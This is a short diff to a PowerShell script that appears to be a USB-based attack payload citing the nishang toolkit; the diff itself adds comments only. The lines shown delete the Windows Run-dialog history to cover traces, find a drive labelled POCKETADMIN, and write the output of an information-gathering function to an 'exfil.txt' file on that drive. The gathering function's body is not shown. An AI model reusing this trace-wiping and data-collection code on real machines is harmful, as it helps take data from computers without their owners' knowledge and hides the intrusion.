@@ -1,4 +1,7 @@
+#clean runline history
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' * -ErrorAction SilentlyContinue
+
+#find correct driveletter based on FAT partition label
 $driveletter=(Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter
 
 
@@ -114,5 +117,5 @@ https://github.com/samratashok/nishang
 
 }
 
-
+#run a function, send it's output data into exfil.txt file on the device
 Get-Information > ${driveletter}:\exfil.txt
